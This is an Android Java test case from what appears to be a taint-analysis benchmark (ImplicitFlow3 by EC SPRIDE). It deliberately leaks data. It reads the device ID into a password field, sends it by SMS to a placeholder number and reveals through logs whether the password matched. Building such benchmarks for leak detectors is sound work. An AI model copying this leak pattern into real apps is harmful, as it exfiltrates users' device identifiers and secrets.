package de.ecspride;


import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.EditText;

import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
/**
 * @testcase_name ImplicitFlow3
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description Based on an input of a password field a log message is written
 * @dataflow source -> userInputPassword -> if-condition -> -> class initialization -> methodCall -> sink
 * @number_of_leaks 2
 * @challenges the analysis must be able to handle implicit flows,
 *  detect callbacks from layout xml file and treat the value of password fields as source
 */
public class ImplicitFlow3 extends Activity {

	private String pass="";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_implicit_flow3);
        ArrayList arrayList = new ArrayList();
		LinkedList linkedList = new LinkedList();
		
		//information to leak: 101
		leakInformationBit(linkedList);
		leakInformationBit(arrayList);
		leakInformationBit(linkedList);	
		
		Log.i("INFO", "before");
    }

    //second leak
  	public void leakData(View view){
  		Log.i("INFO", "before1");
  		//leak bit about correct password
  		EditText mEdit = (EditText)findViewById(R.id.password);
  		mEdit.setText(((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId()); //source
  		pass = mEdit.getText().toString(); //source
  		Log.i("INFO", "before2");
  		
  		Interface classTmp;
  		if(pass.equals("superSecure"))
  			classTmp = new ClassA();
  		else
  			classTmp = new ClassB();
  		
  		classTmp.leakInfo();
  	}

  	
  	private void leakInformationBit(List list){	
  		if(list instanceof ArrayList)
  			Log.i("INFO", "0"); //sink
  		else if(list instanceof LinkedList)
  			Log.i("INFO", "1"); //sink

	}
  	
  	interface Interface{
  		public void leakInfo();
  	}
  	
  	public class ClassA implements Interface{
  		public void leakInfo() {
			Log.i("INFO", "password correct"); //sink, leak

			SmsManager sms = SmsManager.getDefault();
			sms.sendTextMessage("+49 1234", null, pass, null, null); //sink, leak
		}
  	}
  	
  	public class ClassB implements Interface{
  		public void leakInfo(){
			SmsManager sms = SmsManager.getDefault();
			sms.sendTextMessage("+49 1234", null, pass, null, null); //sink, leak
  			Log.i("INFO", "password incorrect"); //sink, leak
  		}
  	}

    
}
